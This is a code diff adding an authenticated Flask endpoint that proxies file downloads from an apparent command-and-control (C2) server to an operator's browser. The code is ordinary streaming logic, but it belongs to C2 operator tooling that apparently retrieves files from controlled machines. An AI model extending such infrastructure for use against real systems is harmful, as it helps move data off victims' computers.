@@ -351,6 +351,39 @@ def get_server_info():
     return _proxy_get("/server_info")
 
 
+@app.route("/api/download_file", methods=["GET"])
+@require_auth
+def download_file():
+    """Proxy file download — streams bytes straight from C2 to browser."""
+    path = request.args.get("path", "")
+    if not path:
+        return jsonify({"error": "path required"}), 400
+    try:
+        r = requests.get(
+            f"{C2_SERVER_URL}/download_file",
+            params={"path": path},
+            headers=C2_AUTH,
+            stream=True,
+            timeout=30,
+        )
+        if not r.ok:
+            return jsonify(r.json()), r.status_code
+
+        from flask import Response as FlaskResponse
+        filename = r.headers.get("Content-Disposition", "").split("filename=")[-1].strip('"') or "file"
+        content_type = r.headers.get("Content-Type", "application/octet-stream")
+        return FlaskResponse(
+            r.iter_content(chunk_size=8192),
+            status=r.status_code,
+            content_type=content_type,
+            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
+        )
+    except requests.exceptions.ConnectionError:
+        return jsonify({"error": "C2 server offline"}), 503
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
 @app.route("/api/server_config", methods=["GET"])
 def get_server_config():
     return _proxy_get("/server_config")
